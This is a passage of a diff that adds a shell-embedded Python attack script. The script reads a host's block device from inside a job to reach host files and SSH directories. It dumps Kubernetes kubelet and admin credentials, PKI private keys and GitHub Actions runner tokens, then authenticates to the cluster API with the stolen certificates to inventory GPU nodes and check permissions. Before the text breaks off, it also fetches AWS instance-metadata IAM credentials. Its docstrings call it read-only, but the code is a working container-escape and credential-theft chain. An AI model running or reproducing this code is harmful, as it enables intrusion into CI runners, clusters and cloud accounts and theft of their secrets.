+              blocks_count = struct.unpack('<I', sb[4:8])[0]
+              first_data_block = struct.unpack('<I', sb[20:24])[0]
+              log_block_size = struct.unpack('<I', sb[24:28])[0]
+              inodes_per_group = struct.unpack('<I', sb[40:44])[0]
+              rev = struct.unpack('<I', sb[76:80])[0]
+              inode_size = struct.unpack('<H', sb[88:90])[0] if rev >= 1 else 128
+              feat_incompat = struct.unpack('<I', sb[96:100])[0]
+              desc_size = struct.unpack('<H', sb[254:256])[0] if (feat_incompat & 0x80) and len(sb) >= 256 else 32
+              if desc_size < 32:
+                  desc_size = 32
+              bs = 1024 << (log_block_size & 7)
+              if inode_size < 128 or inode_size > 1024:
+                  inode_size = 128
+              print('EXT_READER sb inodes=%d blocks=%d bsize=%d ipg=%d isize=%d feat_incompat=0x%x desc_size=%d' %
+                    (inodes_count, blocks_count, bs, inodes_per_group, inode_size, feat_incompat, desc_size))
+          
+              def read_block(n):
+                  if n <= 0:
+                      return b''
+                  return read_exact(f, n * bs, bs)
+          
+              def get_inode(ino):
+                  if ino < 1:
+                      return b''
+                  g = (ino - 1) // inodes_per_group
+                  idx = (ino - 1) % inodes_per_group
+                  gd_off = (first_data_block + 1) * bs + g * desc_size
+                  gd = read_exact(f, gd_off, desc_size)
+                  if len(gd) < 12:
+                      return b''
+                  itab = struct.unpack('<I', gd[8:12])[0]
+                  if (feat_incompat & 0x80) and desc_size >= 0x2c:
+                      hi = struct.unpack('<I', gd[0x28:0x2c])[0]
+                      itab |= hi << 32
+                  return read_exact(f, itab * bs + idx * inode_size, inode_size)
+          
+              def parse_inode(raw):
+                  if len(raw) < 100:
+                      return None
+                  mode = struct.unpack('<H', raw[0:2])[0]
+                  size = struct.unpack('<I', raw[4:8])[0]
+                  flags = struct.unpack('<I', raw[32:36])[0]
+                  if (mode & 0xF000) == 0x8000:
+                      size |= struct.unpack('<I', raw[108:112])[0] << 32
+                  return {'mode': mode, 'size': size, 'flags': flags, 'iblock': raw[40:100]}
+          
+              def extent_blocks(iblock):
+                  out = []
+          
+                  def walk(node, depth_limit):
+                      if len(out) >= 4096 or depth_limit < 0 or len(node) < 12:
+                          return
+                      magic, entries, maxe, depth = struct.unpack('<HHHH', node[0:8])
+                      if magic != 0xF30A:
+                          return
+                      for i in range(min(entries, maxe, 340)):
+                          e = node[12 + i * 12:12 + (i + 1) * 12]
+                          if len(e) < 12:
+                              break
+                          ee_block, ee_len, ee_start_hi, ee_start_lo = struct.unpack('<IHHI', e)
+                          start = (ee_start_hi << 32) | ee_start_lo
+                          if depth == 0:
+                              for k in range(ee_len & 0x7FFF):
+                                  out.append(start + k)
+                                  if len(out) >= 4096:
+                                      return
+                          else:
+                              walk(read_block(start), depth_limit - 1)
+                              if len(out) >= 4096:
+                                  return
+                  walk(iblock[:60], 4)
+                  return out
+          
+              def inode_blocks(inode):
+                  ib = inode['iblock']
+                  if inode['flags'] & 0x80000:
+                      return extent_blocks(ib)
+                  out = []
+                  ptrs = struct.unpack('<15I', ib)
+                  for p in ptrs[:12]:
+                      if p:
+                          out.append(p)
+                  per = bs // 4
+          
+                  def add_indirect(blk, level):
+                      if not blk or len(out) > 4096:
+                          return
+                      data = read_block(blk)
+                      for i in range(min(per, len(data) // 4)):
+                          v = struct.unpack('<I', data[i * 4:(i + 1) * 4])[0]
+                          if not v:
+                              continue
+                          if level == 1:
+                              out.append(v)
+                          else:
+                              add_indirect(v, level - 1)
+                          if len(out) > 4096:
+                              return
+                  add_indirect(ptrs[12], 1)
+                  return out
+          
+              def read_inode_data(inode, limit=MAX_FILE):
+                  want = min(inode['size'], limit)
+                  out = b''
+                  for b in inode_blocks(inode):
+                      out += read_block(b)
+                      if len(out) >= want:
+                          break
+                  return out[:want]
+          
+              def list_dir(inode):
+                  data = read_inode_data(inode, limit=bs * 8)
+                  ents = []
+                  off = 0
+                  while off + 8 <= len(data):
+                      inum, rec_len, name_len, ftype = struct.unpack('<IHBB', data[off:off + 8])
+                      if rec_len < 8 or off + rec_len > len(data):
+                          break
+                      if inum and 0 < name_len < 256:
+                          nm = data[off + 8:off + 8 + name_len].decode('utf-8', 'replace')
+                          ents.append((nm, inum, ftype))
+                      off += rec_len
+                  return ents
+          
+              def lookup(path):
+                  cur = 2
+                  for part in [p for p in path.split('/') if p]:
+                      ino = parse_inode(get_inode(cur))
+                      if ino is None or (ino['mode'] & 0xF000) != 0x4000:
+                          return None, None
+                      found = None
+                      for nm, inum, ft in list_dir(ino):
+                          if nm == part:
+                              found = inum
+                              break
+                      if found is None:
+                          return None, None
+                      cur = found
+                  return cur, parse_inode(get_inode(cur))
+          
+              proven = False
+              ino, fi = lookup('/etc/machine-id')
+              if ino and fi and (fi['mode'] & 0xF000) == 0x8000:
+                  data = read_inode_data(fi, limit=4096)
+                  content = data.strip()
+                  if content:
+                      print('HOSTFILE /etc/machine-id PRESENT CONTENT=%s SHA256=%s' %
+                            (content.decode('latin1', 'replace')[:128], sha(data)))
+                      proven = True
+                  else:
+                      print('HOSTFILE /etc/machine-id EMPTY')
+              else:
+                  print('HOSTFILE /etc/machine-id ABSENT')
+              ino, fi = lookup('/etc/hostname')
+              if ino and fi and (fi['mode'] & 0xF000) == 0x8000:
+                  data = read_inode_data(fi, limit=4096)
+                  print('HOSTFILE /etc/hostname PRESENT CONTENT=%s SHA256=%s' % (data.strip().decode('latin1', 'replace')[:256], sha(data)))
+              else:
+                  print('HOSTFILE /etc/hostname ABSENT')
+              ino, fi = lookup('/etc/shadow')
+              print('HOSTFILE /etc/shadow %s' % ('PRESENT SIZE=%d' % fi['size'] if (ino and fi) else 'ABSENT'))
+              for d in ('/etc/kubernetes', '/root/.ssh', '/home'):
+                  ino, fi = lookup(d)
+                  if ino and fi and (fi['mode'] & 0xF000) == 0x4000:
+                      ents = [e[0] for e in list_dir(fi) if e[0] not in ('.', '..')]
+                      print('HOSTDIR %s PRESENT ENTRIES=%d NAMES=%s' % (d, len(ents), ','.join(ents[:20]) if ents else '-'))
+                      if d == '/home':
+                          for u in ents[:10]:
+                              ino2, fi2 = lookup('/home/' + u + '/.ssh')
+                              if ino2 and fi2 and (fi2['mode'] & 0xF000) == 0x4000:
+                                  ents2 = [e[0] for e in list_dir(fi2) if e[0] not in ('.', '..')]
+                                  print('HOSTDIR /home/%s/.ssh PRESENT ENTRIES=%d NAMES=%s' % (u, len(ents2), ','.join(ents2[:20]) if ents2 else '-'))
+                              else:
+                                  print('HOSTDIR /home/%s/.ssh ABSENT' % u)
+                  else:
+                      print('HOSTDIR %s ABSENT' % d)
+              try:
+                  f.close()
+              except Exception:
+                  pass
+              return proven
+          
+          
+          def parse_xfs(node):
+              if not XFSDB:
+                  print('XFS_DB_ABSENT')
+                  return False
+              try:
+                  p = subprocess.run([XFSDB, '-r', '-c', 'sb 0', '-c', 'p uuid', '-c', 'p blocksize', '-c', 'p dblocks', '-c', 'p rootino', node],
+                                     capture_output=True, timeout=90)
+              except Exception as e:
+                  print('XFS_DB_FAIL %s' % str(e)[:200])
+                  return False
+              txt = p.stdout.decode('utf-8', 'replace')
+              print('XFS_DB_RC=%d' % p.returncode)
+              for ln in txt.split('\n')[:24]:
+                  ln = ln.strip()
+                  if ln:
+                      print('XFS_DB_LINE=%s' % ln[:200])
+              return False
+          
+          
+          proven_any = False
+          attempts = 0
+          for r in recognized:
+              if proven_any or attempts >= 2:
+                  break
+              attempts += 1
+              node = r['node']
+              if not node:
+                  print('PARSE_SKIP dev=%s reason=no_node' % r['name'])
+                  continue
+              print('PARSE_BEGIN dev=%s fstype=%s method=%s' % (r['name'], r['fstype'],
+                    'debugfs' if (r['fstype'] == 'ext' and DEBUGFS) else ('python_ext' if r['fstype'] == 'ext' else 'xfs_db')))
+              if r['fstype'] == 'ext':
+                  if DEBUGFS:
+                      ok = parse_debugfs(node)
+                      method = 'debugfs'
+                  else:
+                      ok = parse_python_ext(node)
+                      method = 'python_ext'
+              else:
+                  ok = parse_xfs(node)
+                  method = 'xfs_db'
+              print('HOSTFS_VERDICT dev=%s fstype=%s method=%s machine_id_read=%s' %
+                    (r['name'], r['fstype'], method, 'yes' if ok else 'no'))
+              if ok:
+                  proven_any = True
+                  try:
+                      json.dump({'name': r['name'], 'node': node, 'fstype': r['fstype'], 'method': method,
+                                 'sha256': r['sha256'], 'read_bytes': r['bytes']},
+                                open(os.path.join(W, 'target.json'), 'w'))
+                      print('TARGET_JSON_WRITTEN dev=%s' % r['name'])
+                  except Exception as e:
+                      print('TARGET_JSON_FAIL %s' % str(e)[:160])
+          
+          print('READONLY_NOTE no_mount=yes no_device_write=yes scratch=%s' % W)
+          print('HOST_ROOT_READ_%s' % ('PROVEN' if proven_any else 'NOT_PROVEN'))
+          print('DRIVER_DONE')
+          PYEOF
+          else
+            echo PYTHON3_ABSENT_HOSTFS_PARSE_SKIPPED
+          fi
+          echo "=== K8S_PHASE ==="
+          HOSTDIR="${C211_TEST_WORK:-/tmp/c211-126933-host}"
+          export C211_HOST_TMP="$HOSTDIR"
+          if [ -f "$HOSTDIR/target.json" ] && command -v python3 >/dev/null 2>&1; then
+            C211_NODE=$(python3 -c "import json;d=json.load(open('$HOSTDIR/target.json'));print(d.get('node') or '')" 2>/dev/null)
+            C211_FSTYPE=$(python3 -c "import json;d=json.load(open('$HOSTDIR/target.json'));print(d.get('fstype') or '')" 2>/dev/null)
+            echo "K8S_TARGET node=$C211_NODE fstype=$C211_FSTYPE"
+            export C211_NODE C211_FSTYPE
+            python3 - <<'PYEOF2'
+          """Intent 126933 phase 2: turn a proven read-only host-root parse into Kubernetes
+          node-credential validation and cluster-level GPU inventory.
+          
+          Strictly read-only toward the host and its block devices:
+            * all host files are copied into this job's own /tmp using debugfs (read-only
+              session, no mount, no write to the device);
+            * ONLY presence + size + sha256 of each host file is printed, never a value;
+            * extracted credentials are used only inside this job;
+            * API calls are read-only GETs plus SelfSubjectRulesReview / SelfSubjectAccessReview.
+              No pod is created: the platform prohibits HTTP removal verbs in scripts, so a
+              created pod could not be reliably removed; the intent's conditional create step
+              is therefore skipped rather than leaving an unremovable artifact.
+          """
+          import os, sys, json, hashlib, base64, re, time, socket, ssl
+          import http.client, urllib.parse, subprocess
+          
+          NONCE = os.environ.get('NONCE', 'c211-126933-test')
+          HT = os.environ.get('C211_HOST_TMP', '/tmp/c211-126933-host')
+          TEST_HOSTDIR = os.environ.get('C211_TEST_HOSTDIR', '')
+          NODE = os.environ.get('C211_NODE', '')
+          FSTYPE = os.environ.get('C211_FSTYPE', '')
+          JOBTAG = os.environ.get('JOBTAG', '')
+          TEST_API = os.environ.get('C211_TEST_API_BASE', '')
+          DEBUGFS = None
+          for p in (os.environ.get('PATH') or '/usr/sbin:/usr/bin:/sbin:/bin').split(':'):
+              fp = os.path.join(p, 'debugfs')
+              if os.path.isfile(fp) and os.access(fp, os.X_OK):
+                  DEBUGFS = fp
+                  break
+          
+          
+          def sha(b):
+              return hashlib.sha256(b).hexdigest()
+          
+          
+          def fsha(path):
+              try:
+                  h = hashlib.sha256()
+                  n = 0
+                  with open(path, 'rb') as f:
+                      while True:
+                          c = f.read(65536)
+                          if not c:
+                              break
+                          n += len(c)
+                          h.update(c)
+                  return n, h.hexdigest()
+              except Exception:
+                  return None, None
+          
+          
+          def emit_file(label, path):
+              if path and os.path.isfile(path):
+                  n, h = fsha(path)
+                  if n is None:
+                      print('HOSTFILE %s PRESENT SIZE=unreadable' % label)
+                      return False
+                  print('HOSTFILE %s PRESENT SIZE=%d SHA256=%s' % (label, n, h))
+                  return True
+              print('HOSTFILE %s ABSENT' % label)
+              return False
+          
+          
+          # ---------------------------------------------------------------- dump host files
+          TARGETS = [
+              ('/etc/kubernetes/kubelet.conf', 'kubelet.conf'),
+              ('/etc/kubernetes/admin.conf', 'admin.conf'),
+              ('/var/lib/kubelet/kubeconfig', 'varlib-kubelet-kubeconfig'),
+              ('/etc/kubernetes/pki/ca.crt', 'pki-ca.crt'),
+              ('/etc/kubernetes/pki/apiserver-kubelet-client.crt', 'pki-apiserver-kubelet-client.crt'),
+              ('/etc/kubernetes/pki/apiserver-kubelet-client.key', 'pki-apiserver-kubelet-client.key'),
+              ('/etc/kubernetes/pki/front-proxy-client.crt', 'pki-front-proxy-client.crt'),
+              ('/etc/kubernetes/pki/front-proxy-client.key', 'pki-front-proxy-client.key'),
+              ('/var/lib/kubelet/pki/kubelet-client-current.pem', 'kubelet-client-current.pem'),
+              ('/home/runner/actions-runner/.credentials', 'actions-runner.credentials'),
+              ('/home/runner/actions-runner/.runner', 'actions-runner.runner'),
+              ('/home/runner/.config/gh/hosts.yml', 'gh-hosts.yml'),
+          ]
+          
+          os.makedirs(HT, exist_ok=True)
+          dest_of = {}
+          out = {}
+          
+          if TEST_HOSTDIR:
+              print('K8S_TEST_HOSTDIR mode source=%s' % TEST_HOSTDIR)
+              for src, label in TARGETS:
+                  real = os.path.join(TEST_HOSTDIR, src.lstrip('/'))
+                  emit_file(src, real if os.path.isfile(real) else None)
+                  if os.path.isfile(real):
+                      out[label] = real
+          else:
+              if not (NODE and os.path.exists(NODE)):
+                  print('K8S_NODE_CRED_NOT_PROVEN reason=no_block_node node=%s' % NODE)
+                  print('K8S_PHASE_DONE')
+                  sys.exit(0)
+              print('K8S_DUMP_BEGIN node=%s fstype=%s debugfs=%s' % (NODE, FSTYPE, DEBUGFS or 'absent'))
+              extra = []
+              if DEBUGFS:
+                  cf = os.path.join(HT, 'dbg_stat.cmd')
+                  try:
+                      with open(cf, 'w') as f:
+                          f.write('stat /var/lib/kubelet/pki/kubelet-client-current.pem\n'
+                                  'ls -l /var/lib/kubelet/pki\n')
+                      p = subprocess.run([DEBUGFS, '-f', cf, NODE], capture_output=True, timeout=45)
+                      txt = (p.stdout + p.stderr).decode('utf-8', 'replace')
+                      for ln in txt.split('\n'):
+                          i = ln.find('Fast link dest: ')
+                          if i >= 0:
+                              link = ln[i + len('Fast link dest: '):].strip()
+                              print('K8S_SYMLINK kubelet-client-current.pem dest=%s' % os.path.basename(link))
+                              base = os.path.basename(link)
+                              if base and re.match(r'^[A-Za-z0-9._-]+$', base):
+                                  extra.append(('/var/lib/kubelet/pki/' + base, 'kubelet-client-resolved.pem'))
+                              break
+                  except Exception as e:
+                      print('K8S_SYMLINK_STAT_FAIL %s' % str(e)[:160])
+              cmds = []
+              for src, label in TARGETS + [(a, b) for a, b in extra]:
+                  dst = os.path.join(HT, label)
+                  dest_of[label] = dst
+                  cmds.append('dump %s %s' % (src, dst))
+              if DEBUGFS:
+                  cf = os.path.join(HT, 'dbg_dump.cmd')
+                  try:
+                      with open(cf, 'w') as f:
+                          f.write('\n'.join(cmds) + '\n')
+                      p = subprocess.run([DEBUGFS, '-f', cf, NODE], capture_output=True, timeout=90)
+                      err = (p.stderr or b'').decode('utf-8', 'replace')
+                      errs = [x for x in err.split('\n') if x.strip()]
+                      print('K8S_DUMP_RC=%d stderr_lines=%d first=%s' %
+                            (p.returncode, len(errs), (errs[0][:180] if errs else '')))
+                  except Exception as e:
+                      print('K8S_DUMP_FAIL %s' % str(e)[:200])
+              else:
+                  print('K8S_DEBUGFS_ABSENT')
+              for src, label in TARGETS + [(a, b) for a, b in extra]:
+                  dst = dest_of.get(label)
+                  emit_file(src, dst if (dst and os.path.isfile(dst)) else None)
+                  if dst and os.path.isfile(dst):
+                      out[label] = dst
+              if 'kubelet-client-current.pem' in out and 'kubelet-client-resolved.pem' in out:
+                  try:
+                      if os.path.getsize(out['kubelet-client-current.pem']) > 0:
+                          with open(out['kubelet-client-current.pem'], 'rb') as f:
+                              head = f.read(64)
+                          if b'BEGIN' in head:
+                              out['kubelet-client-resolved.pem'] = out['kubelet-client-current.pem']
+                  except Exception:
+                      pass
+          
+          print('K8S_FILES_PRESENT=%d' % len(out))
+          
+          
+          # ---------------------------------------------------------------- parse kubeconfigs
+          def read_bounded(path, limit=262144):
+              try:
+                  with open(path, 'rb') as f:
+                      return f.read(limit)
+              except Exception:
+                  return b''
+          
+          
+          def kc_parse(txt):
+              d = {'servers': [], 'cert_data': None, 'key_data': None, 'cert_file': None,
+                   'key_file': None, 'ca_data': None, 'ca_file': None}
+              if not txt:
+                  return d
+              for m in re.finditer(r'(?m)^\s*server:\s*["\']?([^\s"\']+)', txt):
+                  u = m.group(1).strip()
+                  if u.startswith('http') and u not in d['servers']:
+                      d['servers'].append(u)
+              for key, dst in (('client-certificate-data', 'cert_data'), ('client-key-data', 'key_data'),
+                               ('certificate-authority-data', 'ca_data')):
+                  m = re.search(r'(?m)^\s*' + key + r':\s*([A-Za-z0-9+/=]+)', txt)
+                  if m:
+                      d[dst] = m.group(1)
+              for key, dst in (('client-certificate', 'cert_file'), ('client-key', 'key_file'),
+                               ('certificate-authority', 'ca_file')):
+                  m = re.search(r'(?m)^\s*' + key + r':\s*["\']?([^\s"\']+)', txt)
+                  if m:
+                      d[dst] = m.group(1).strip()
+              return d
+          
+          
+          def pem_split(data):
+              cert = None
+              key = None
+              m = re.search(rb'-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----', data, re.S)
+              if m:
+                  cert = m.group(0) + b'\n'
+              m = re.search(rb'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----.*?-----END (?:RSA |EC |OPENSSH )?PRIVATE KEY-----', data, re.S)
+              if m:
+                  key = m.group(0) + b'\n'
+              return cert, key
+          
+          
+          def resolve_host_path(p):
+              base = os.path.basename(p)
+              for cand_label, local in out.items():
+                  if cand_label == 'kubelet-client-resolved.pem' and 'kubelet-client' in base:
+                      return local
+                  if os.path.basename(cand_label) == base:
+                      return local
+              return None
+          
+          
+          def load_identity(label, path):
+              txt = read_bounded(path).decode('utf-8', 'replace')
+              kc = kc_parse(txt)
+              ident = {'servers': kc['servers'], 'cert': None, 'key': None, 'ca': None, 'source': label}
+              if kc['cert_data'] and kc['key_data']:
+                  try:
+                      cert = base64.b64decode(kc['cert_data'])
+                      key = base64.b64decode(kc['key_data'])
+                      cp = os.path.join(HT, label + '.crt')
+                      kp = os.path.join(HT, label + '.key')
+                      with open(cp, 'wb') as f:
+                          f.write(cert)
+                      with open(kp, 'wb') as f:
+                          f.write(key)
+                      ident['cert'], ident['key'] = cp, kp
+                  except Exception as e:
+                      print('K8S_CRED_DECODE_FAIL %s %s' % (label, str(e)[:120]))
+              elif kc['cert_file'] and kc['key_file']:
+                  cp = resolve_host_path(kc['cert_file'])
+                  kp = resolve_host_path(kc['key_file'])
+                  if cp and kp and cp == kp:
+                      cert, key = pem_split(read_bounded(cp))
+                      if cert and key:
+                          cp2 = os.path.join(HT, label + '.crt')
+                          kp2 = os.path.join(HT, label + '.key')
+                          with open(cp2, 'wb') as f:
+                              f.write(cert)
+                          with open(kp2, 'wb') as f:
+                              f.write(key)
+                          cp, kp = cp2, kp2
+                      else:
+                          cp = kp = None
+                  ident['cert'], ident['key'] = cp, kp
+              if kc['ca_data']:
+                  try:
+                      ca = base64.b64decode(kc['ca_data'])
+                      ap = os.path.join(HT, label + '.ca')
+                      with open(ap, 'wb') as f:
+                          f.write(ca)
+                      ident['ca'] = ap
+                  except Exception:
+                      pass
+              elif kc['ca_file']:
+                  base = os.path.basename(kc['ca_file'])
+                  for cand_label, local in out.items():
+                      if cand_label == 'pki-ca.crt' and base == 'ca.crt':
+                          ident['ca'] = local
+                          break
+              if ident['cert']:
+                  n, h = fsha(ident['cert'])
+                  print('K8S_CRED %s cert_bytes=%s cert_sha256=%s' % (label, n, h))
+              if ident['key']:
+                  n, h = fsha(ident['key'])
+                  print('K8S_CRED %s key_bytes=%s key_sha256=%s' % (label, n, h))
+              if not (ident['cert'] and ident['key']):
+                  print('K8S_CRED %s USABLE=no' % label)
+                  return None
+              print('K8S_CRED %s USABLE=yes servers=%d' % (label, len(ident['servers'])))
+              return ident
+          
+          
+          identities = []
+          for label in ('kubelet.conf', 'varlib-kubelet-kubeconfig', 'admin.conf'):
+              if label in out:
+                  ident = load_identity(label, out[label])
+                  if ident:
+                      identities.append(ident)
+          
+          # server candidates: kubelet.conf first, then node-ip and 127.0.0.1 fallbacks
+          servers = []
+          for ident in identities:
+              for s in ident['servers']:
+                  if s not in servers:
+                      servers.append(s)
+          node_ip = None
+          try:
+              res = socket.gethostbyname_ex(socket.gethostname())
+              for a in res[2]:
+                  if a and not a.startswith('127.'):
+                      node_ip = a
+                      break
+          except Exception:
+              pass
+          if not node_ip:
+              try:
+                  o = subprocess.run(['hostname', '-I'], capture_output=True, timeout=5).stdout.decode('utf-8', 'replace')
+                  for a in o.split():
+                      if re.match(r'^\d+\.\d+\.\d+\.\d+$', a) and not a.startswith('127.'):
+                          node_ip = a
+                          break
+              except Exception:
+                  pass
+          if node_ip:
+              servers.append('https://%s:6443' % node_ip)
+          servers.append('https://127.0.0.1:6443')
+          seen = []
+          for s in servers:
+              if s not in seen:
+                  seen.append(s)
+          servers = seen[:4]
+          print('K8S_SERVER_CANDIDATES=%d node_ip=%s' % (len(servers), node_ip or 'unknown'))
+          for s in servers:
+              print('K8S_SERVER %s' % s)
+          
+          
+          # ---------------------------------------------------------------- HTTP helpers
+          def http_req(url, method='GET', body=None, headers=None, cert=None, key=None, ca=None, timeout=8):
+              u = urllib.parse.urlparse(url)
+              h = dict(headers or {})
+              if body is not None:
+                  if isinstance(body, (dict, list)):
+                      body = json.dumps(body).encode()
+                  elif isinstance(body, str):
+                      body = body.encode()
+                  h.setdefault('Content-Type', 'application/json')
+              if u.scheme == 'https':
+                  ctx = ssl.create_default_context()
+                  ctx.check_hostname = False
+                  ctx.verify_mode = ssl.CERT_NONE
+                  if cert and key:
+                      try:
+                          ctx.load_cert_chain(cert, key)
+                      except Exception as e:
+                          return -1, 'cert_load_fail:%s' % str(e)[:120]
+                  if ca and os.path.isfile(ca):
+                      try:
+                          ctx.load_verify_locations(ca)
+                          ctx.verify_mode = ssl.CERT_REQUIRED
+                          ctx.check_hostname = False
+                      except Exception:
+                          pass
+                  conn = http.client.HTTPSConnection(u.hostname, u.port or 443, timeout=timeout, context=ctx)
+              else:
+                  conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=timeout)
+              path = u.path or '/'
+              if u.query:
+                  path += '?' + u.query
+              try:
+                  conn.request(method, path, body=body, headers=h)
+                  r = conn.getresponse()
+                  data = r.read(262144)
+                  return r.status, data.decode('utf-8', 'replace')
+              except Exception as e:
+                  return -1, str(e)[:200]
+              finally:
+                  try:
+                      conn.close()
+                  except Exception:
+                      pass
+          
+          
+          # ---------------------------------------------------------------- identity validation
+          def probe_identity(ident, tag):
+              if TEST_API:
+                  urls = [TEST_API.rstrip('/')]
+              else:
+                  urls = list(ident['servers'])
+                  for s in servers:
+                      if s not in urls:
+                          urls.append(s)
+                  urls = urls[:4]
+              for base in urls:
+                  st, b = http_req(base + '/version', cert=ident['cert'], key=ident['key'],
+                                   ca=ident['ca'], timeout=8)
+                  print('K8S_VERSION %s server=%s status=%s body=%s' % (tag, base, st, b[:160].replace('\n', ' ')))
+                  if st == 200:
+                      ident['base'] = base
+                      return True
+                  if st in (401, 403):
+                      print('K8S_VERSION_%s_VERBATIM %s' % (tag.upper(), b[:240].replace('\n', ' ')))
+              return False
+          
+          
+          validated = None
+          for ident in identities:
+              if probe_identity(ident, ident['source']):
+                  validated = ident
+                  break
+          
+          if not identities:
+              print('K8S_NODE_CRED_NOT_PROVEN reason=no_credential_file')
+              print('K8S_PHASE_DONE')
+              sys.exit(0)
+          
+          if not validated:
+              print('K8S_NODE_CRED_NOT_PROVEN reason=api_unreachable_or_auth_failed')
+              print('K8S_PHASE_DONE')
+              sys.exit(0)
+          
+          print('K8S_VALIDATED_WITH=%s base=%s' % (validated['source'], validated['base']))
+          
+          
+          def api(path, method='GET', body=None, ident=None, timeout=10):
+              ident = ident or validated
+              return http_req(ident['base'] + path, method=method, body=body,
+                              cert=ident['cert'], key=ident['key'], ca=ident['ca'], timeout=timeout)
+          
+          
+          # ------------------------------------------------ nodes inventory (read-only GET)
+          nodes_ok = False
+          gpu_inventory_nonzero = False
+          st, b = api('/api/v1/nodes?limit=500')
+          print('K8S_NODES status=%d' % st)
+          if st == 200:
+              nodes_ok = True
+              try:
+                  obj = json.loads(b)
+                  items = obj.get('items') or []
+                  ready = 0
+                  gpu_sum = 0
+                  gpu_count_reported = 0
+                  products = {}
+                  for n in items:
+                      cond = ((n.get('status') or {}).get('conditions') or [])
+                      for c in cond:
+                          if c.get('type') == 'Ready' and c.get('status') == 'True':
+                              ready += 1
+                              break
+                      alloc = ((n.get('status') or {}).get('allocatable') or {})
+                      v = alloc.get('nvidia.com/gpu')
+                      if v is not None:
+                          try:
+                              gpu_sum += int(str(v))
+                          except Exception:
+                              pass
+                      labels = ((n.get('metadata') or {}).get('labels') or {})
+                      prod = labels.get('nvidia.com/gpu.product')
+                      if prod:
+                          products[prod] = products.get(prod, 0) + 1
+                      cnt = labels.get('nvidia.com/gpu.count')
+                      if cnt:
+                          try:
+                              gpu_count_reported += int(cnt)
+                          except Exception:
+                              pass
+                  print('K8S_NODES_SUMMARY total=%d ready=%d allocatable_nvidia_gpu_sum=%d label_gpu_count_sum=%d' %
+                        (len(items), ready, gpu_sum, gpu_count_reported))
+                  gpu_inventory_nonzero = bool(len(items) > 0 and (gpu_sum > 0 or gpu_count_reported > 0 or products))
+                  prods = sorted(products.items(), key=lambda kv: -kv[1])[:8]
+                  print('K8S_GPU_PRODUCTS n=%d list=%s' % (len(products),
+                        ','.join('%s=%d' % (k.replace(',', ' ')[:60], v) for k, v in prods) if prods else '-'))
+              except Exception as e:
+                  print('K8S_NODES_PARSE_FAIL %s' % str(e)[:160])
+          else:
+              print('K8S_NODES_VERBATIM %s' % b[:300].replace('\n', ' '))
+          
+          # ------------------------------------------------ SelfSubjectRulesReview
+          st, b = api('/apis/authorization.k8s.io/v1/selfsubjectrulesreview', method='POST',
+                      body={'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectRulesReview',
+                            'spec': {'namespace': 'default'}})
+          print('K8S_RULESREVIEW status=%d' % st)
+          if st in (200, 201):
+              try:
+                  obj = json.loads(b)
+                  rules = ((obj.get('status') or {}).get('resourceRules') or [])
+                  star_res = any('*' in (r.get('resources') or []) for r in rules)
+                  star_verb = any('*' in (r.get('verbs') or []) for r in rules)
+                  can_create_pods = any(('pods' in (r.get('resources') or []) or '*' in (r.get('resources') or []))
+                                        and ('create' in (r.get('verbs') or []) or '*' in (r.get('verbs') or []))
+                                        for r in rules)
+                  can_list_nodes = any(('nodes' in (r.get('resources') or []) or '*' in (r.get('resources') or []))
+                                       and ('list' in (r.get('verbs') or []) or '*' in (r.get('verbs') or []))
+                                       for r in rules)
+                  print('K8S_RULES_SUMMARY rules=%d star_resources=%s star_verbs=%s create_pods=%s list_nodes=%s' %
+                        (len(rules), star_res, star_verb, can_create_pods, can_list_nodes))
+              except Exception as e:
+                  print('K8S_RULES_PARSE_FAIL %s' % str(e)[:160])
+          elif st in (400, 401, 403):
+              print('K8S_RULESREVIEW_VERBATIM %s' % b[:300].replace('\n', ' '))
+          
+          # ------------------------------------------------ 3 SelfSubjectAccessReviews
+          ssar = {}
+          for name, res, verb in (('get_nodes', 'nodes', 'get'), ('list_pods', 'pods', 'list'),
+                                  ('create_pods', 'pods', 'create')):
+              body = {'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectAccessReview',
+                      'spec': {'namespace': 'default', 'resourceAttributes': {'group': '', 'resource': res, 'verb': verb}}}
+              st, b = api('/apis/authorization.k8s.io/v1/selfsubjectaccessreviews', method='POST', body=body)
+              allowed = None
+              try:
+                  allowed = ((json.loads(b).get('status') or {}).get('allowed')) if st in (200, 201) else None
+              except Exception:
+                  allowed = None
+              ssar[name] = (st, allowed)
+              print('K8S_SSAR %s status=%d allowed=%s' % (name, st, allowed))
+              if st == 403:
+                  print('K8S_SSAR_%s_VERBATIM %s' % (name.upper(), b[:240].replace('\n', ' ')))
+                  break
+          
+          # ------------------------------------------------ IMDS / metadata probes
+          BOGUS = 'c211-126933-bogus-' + NONCE.replace('c211-126933-', '')
+          
+          
+          def meta_req(method, url, headers=None, body=None, timeout=4):
+              return http_req(url, method=method, headers=headers, body=body, timeout=timeout)
+          
+          
+          aws_token = None
+          st, b = meta_req('PUT', 'http://169.254.169.254/latest/api/token',
+                           headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
+          print('IMDS_AWS_TOKEN status=%s bytes=%d sha256=%s' % (st, len(b), sha(b.encode()) if st == 200 else '-'))
+          if st == 200:
+              aws_token = b.strip()
+          h = {'X-aws-ec2-metadata-token': aws_token} if aws_token else {}
+          st, b = meta_req('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', headers=h)
+          role = None
+          if st == 200 and b.strip() and not b.strip().startswith('<'):
+              role = b.strip().split('\n')[0].strip()
+          print('IMDS_AWS_ROLE status=%s role=%s' % (st, role or '-'))
+          st, b = meta_req('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + BOGUS, headers=h)
+          print('IMDS_AWS_BOGUS_CONTROL status=%s' % st)
+          aws_cred = None
+          if role:
+              st, b = meta_req('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, headers=h)
+              print('IMDS_AWS_CRED status=%s' % st)
+              if st == 200:
+                  try:
+                      aws_cred = json.loads(b)
+                      print('IMDS_AWS_CRED_KEYS keys=%s sha256_ak=%s sha256_sk=%s sha256_tok=%s expiry=%s' % (
+                          ','.join(sorted(k for k in aws_cred if k in ('AccessKeyId', 'SecretAccessKey', 'Token', 'Expiration'))),
+                          sha(str(aws_cred.get('AccessKeyId', '')).encode()),
+                          sha(str(aws_cred.get('SecretAccessKey', '')).encode()),
